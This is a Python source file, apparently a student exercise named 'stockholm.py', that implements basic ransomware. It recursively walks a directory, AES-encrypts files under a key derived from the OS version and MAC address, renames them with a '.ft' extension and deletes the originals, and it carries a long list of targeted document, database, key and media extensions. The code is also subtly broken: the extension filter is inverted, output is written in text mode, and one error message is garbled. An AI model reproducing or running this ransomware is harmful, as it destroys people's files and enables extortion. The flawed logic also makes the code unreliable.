# -*- coding: utf-8 -*-
#
# ./stockholm.py
# Eduardo Banderas Alba
# 2022-07
#
# Cifrado de ficheros de un determinado tipo
#
"""
  {0} [-help] [-version] [-reverse <password>] [-silent] [-infection <path>]

     -help                Show help
     -version             Show program version
     -silent              Dont show any information
     -reverse   <pw>      Decrypt files
     -infection <path>    Encrypt files
"""
import os, sys, json
import uuid, platform

# Modules for encrypt and decrypt files
import hmac

from hashlib               import sha256
from base64                import b64encode, b64decode
from Crypto.Cipher         import AES
from Crypto.Random         import get_random_bytes
from Crypto.Util.Padding   import pad, unpad


class args:
  infection = './data'
  filetypes = [ '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt',
                '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods',
                '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp',
                '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay',
                '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb',
                '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
                '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm',
                '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch',
                '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar',
                '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg',
                '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv',
                '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg',
                '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif',
                '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip',
                '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ',
                '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx',
                '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf',
                '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd',
                '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam',
                '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm',
                '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
                '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc' ]

  silent  = False
  reverse = False
  passwd  = platform.version()
  seed    = "{0:0x}".format(uuid.getnode())
  version = "alpha v0.0.1"
#class args


def main():
  parse_arguments()
  if not os.path.exists(args.infection):
    halt("ERROR: the directory not found")

  cipher = aes(args.passwd, args.seed)

  for x in explore(args.infection):
    if not args.silent:
      logger('- File {0}'.format(x))

    name, ext = os.path.splitext(x)

    if ext not in args.filetypes and ext == '.ft':
      logger('  - discard')
      continue

    with open(x, 'rb') as f:
      content = f.read()

    if content:
      if args.reverse:
        cipher.decrypt(content)
        write_file(cipher.decrypted, name)
        os.remove(x)
      else:
        cipher.encrypt(content)
        write_file(cipher.encrypted, x + '.ft')
        os.remove(x)
    #endif
  #endfor
#main


def write_file(content, filepath):
  with open(filepath, 'w') as fw:
    fw.write(content)

def explore(path):
  for root, dirs, files in os.walk(path):
    for f in files:
      yield os.path.join(root, f)


def parse_arguments():
  options_ = [ '-help', '-version', '-reverse', '-silent', '-infection' ]
  options  = ' '.join(sys.argv[1:]).rstrip().split(' ')

  if len(options) <= 1 and options[-1] == '':
    return

  i = 0
  while len(options) > i:
    data = options[i]
    if data not in options_:
      _halt_with_doc('ERROR: option not recognized {0}'.format(data), 1)
    elif data == '-help':
      _halt_with_doc('', 0)
    elif data == '-version':
      halt('VERSION: {0}'.format(args.version), 0)
    elif data == '-silent':
      args.silent = True
    elif data == '-reverse':
      #i += 1
      args.reverse  = True
      #if i >= len(options) or options[i] in options_:
        #halt('ERROR: -reverse option require a value', 1)

      #args.passwd = options[i]
    elif data == '-infection':
      i += 1
      if i >= len(options) or options[i] in options_:
        halt('ERROR: -infection option require a value', 1)

      args.infection = options[i]

    i += 1
  #endwhile
#parse_arguments


def logger(msg, out=sys.stdout):
  try:
    if isinstance(msg, dict) or isinstance(msg, list) or isinstance(msg, tuple):
      msg = json.dumps(msg, indent=2)
  except:
    pass

  out.write(msg + "\n")
#logger


def halt(msg, code = 0):
  logger(msg, out=sys.stderr)
  sys.exit(code)
#_halt


def _halt_with_doc(msg, code = 0):
  halt(msg + '\n' + '-' * 80 + __doc__.format(sys.argv[0]), code)
#_halt_with_doc

class aes(object):

  _key     = None
  _round   = 4000
  _debug   = False
  _encrypt = None
  _decrypt = None
  _encrypted = None
  _decrypted = None

  class aesException(Exception):
    def __init__(self, msg):      self.msg = msg
    def __str__(self):            return repr(self.msg)
  #class aesException

  def __init__(self, k, s, debug=False):
    self.seed  = s
    self.key   = k
    self.debug = debug

  def __del__(self):
    if self.debug:
      logger('* aes object:')
      logger({
        'key': self.key.hex(),
        'round': self._round,
        'seed': self.seed,
        'mode': AES.MODE_CBC,
        'block_size': AES.block_size,
        'encrypt': self.encrypted,
        'decrypt': self.decrypted
      })

  def encrypt(self, plain):
    iv     = get_random_bytes(AES.block_size)
    cipher = AES.new(self.key, AES.MODE_CBC, iv)

    self._encrypted = b64encode(iv + cipher.encrypt(
      pad(plain,
      AES.block_size
    )))
  #encrypt

  def decrypt(self, encrypt):
    encrypt = b64decode(encrypt)
    iv      = encrypt[:AES.block_size]
    cipher  = AES.new(self.key, AES.MODE_CBC, iv)

    try:
      self._decrypted = unpad(
        cipher.decrypt(encrypt[AES.block_size:]),
        AES.block_size
      )
    except:
      raise aes.aesException("ERROR: decryption failed, the password is correct")
  #decrypt

  def _kdf(self, v):
    try:
      kdf = b''
      for i in range(0, self._round):
        for c in v:
          kdf = hmac.new(
            self.seed.encode('UTF-8'),
            self.seed.encode('UTF-8') + kdf + c.encode('UTF-8'),
            digestmod=sha256
          ).digest()

      return kdf
    except:
      raise aes.aesException('ERROR: Seed not defined')
  #_kdf

  @property
  def encrypted(self):
    data = None
    if self._encrypted:
      data = self._encrypted.decode('UTF-8')

    return data

  @encrypted.setter
  def encrypted(self, v):
    self._encrypted = v

  @property
  def decrypted(self):
    data = None
    if self._decrypted:
      data = self._decrypted.decode('UTF-8')

    return data

  @decrypted.setter
  def decrypted(self, v):
    self._decrypted = v

  @property
  def seed(self):
    return self._seed

  @seed.setter
  def seed(self, v):
    self._seed = v

  @property
  def key(self):
    return self._key

  @key.setter
  def key(self, v):
    self._key = self._kdf(v)

  @property
  def debug(self):
    return self._debug

  @debug.setter
  def debug(self, v):
    self._debug = v
#class aes


if __name__ == "__main__":
  try:    reload(sys); sys.setdefaultencoding("utf8")
  except: pass

  main()
